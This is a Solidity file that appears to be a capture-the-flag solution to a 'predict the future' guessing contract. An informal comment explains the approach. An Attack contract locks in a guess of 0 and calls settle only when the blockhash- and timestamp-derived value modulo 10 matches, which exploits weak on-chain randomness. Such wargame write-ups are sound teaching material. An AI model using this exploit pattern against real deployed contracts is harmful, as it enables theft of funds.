/*
    Was kind of tricky, like if you try doing some clever math, you might get a feeling that you are damn smart but there are good chances those efforts might go in vain..
    Anyways, this time we have to predict the number in advance and as you notice making a guess like last time won't work because..block.number is checked if you notice the code carefully

    So how we solve this?

    1. First hint is provided in the code itself, the `settle` function, in which the guess is modded by `% 10`, This makes us sure that the guess is sure to be between 0-10
    2. Now, we can't make the guess everytime between 0-10, the thing we can do is, let's fix our guess and call that settle function again and again cuz atleast once in a time it will meet the condition..but then why would someone will waste such amount of gas
    3. For that, see the `attack` function down below, there you will notice the check `require(answer == 0)`, which do checks everytime whether we got the answer or not, and when we got that `settle` function be called.

    Have Fun, and let's nail down the next question...
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IGuessTheRandomNumber{
    function lockInGuess(uint8) external;
    function settle() external;
}

contract Attack{
    IGuessTheRandomNumber public target;

    constructor(address victim){
        target = IGuessTheRandomNumber(victim);
    }

    function solve() external{
        uint8 answer = 0;
        target.lockInGuess(answer);
    }

    function attack() external{
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == 0);

        target.settle();
    }
}